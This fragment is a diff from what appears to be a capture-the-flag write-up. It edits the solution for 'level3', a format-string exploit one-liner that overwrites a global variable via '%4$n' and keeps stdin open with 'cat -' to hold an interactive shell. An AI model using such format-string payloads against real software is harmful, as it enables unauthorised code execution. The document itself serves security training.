@@ -17,7 +17,7 @@ the printf call use the format string contained in the buffer, leading to a form
 
 ### SOLUTION
 ``` bash
-python -c 'print("[m global addr]" +"a"*60+ "%4$n")' | ./level3
+(python -c 'print("[m global addr]" +"a"*60+ "%4$n")'; cat -) | ./level3
 ```
 
 ### COMMAND EXPLANATION
